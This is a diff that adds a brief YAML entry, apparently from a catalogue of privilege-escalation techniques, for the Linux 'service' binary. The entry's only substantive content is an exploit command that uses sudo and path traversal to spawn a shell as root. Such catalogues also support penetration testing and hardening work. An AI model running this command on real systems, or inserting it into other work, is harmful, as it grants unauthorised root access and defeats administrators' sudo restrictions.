@@ -1,0 +1,4 @@
+name: service
+binary_path: /usr/bin/service
+exploit_cmds:
+- sudo /usr/bin/service ../../bin/sh
